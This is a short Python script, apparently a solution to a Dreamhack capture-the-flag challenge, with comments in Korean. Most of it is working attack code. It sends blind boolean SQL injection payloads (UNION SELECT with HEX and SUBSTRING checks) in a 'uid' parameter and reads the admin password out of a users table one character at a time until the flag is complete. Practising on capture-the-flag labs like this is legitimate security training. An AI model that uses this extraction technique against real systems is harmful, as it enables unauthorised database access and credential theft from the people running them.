import requests

url = "http://host8.dreamhack.games:8247/"
flag = ""

for pos in range(1, 200):
    # 1. HEX 길이 (2 또는 6)
    length_found = None
    for L in (2, 6):
        payload = f"' UNION SELECT 1,'a','b' FROM DUAL WHERE CHAR_LENGTH(HEX(SUBSTRING((SELECT upw FROM users WHERE uid='admin'),{pos},1)))={L} -- "
        r = requests.get(url, params={"uid": payload})
        if "exists" in r.text:
            length_found = L
            break

    # 2. HEX 값 추출 (자릿수마다)
    hex_char = ""
    for i in range(1, length_found + 1):
        for ch in "0123456789ABCDEF":
            payload = f"' UNION SELECT 1,'a','b' FROM DUAL WHERE SUBSTRING(HEX(SUBSTRING((SELECT upw FROM users WHERE uid='admin'),{pos},1)),{i},1)='{ch}' -- "
            r = requests.get(url, params={"uid": payload})
            if "exists" in r.text:
                hex_char += ch
                break

    # 3. HEX → 문자 변환
    char = bytes.fromhex(hex_char).decode("utf-8")
    flag += char
    print(f"[+] pos {pos}: {char}")

    if char == "}":
        print(f"[+] FLAG = {flag}")
        break
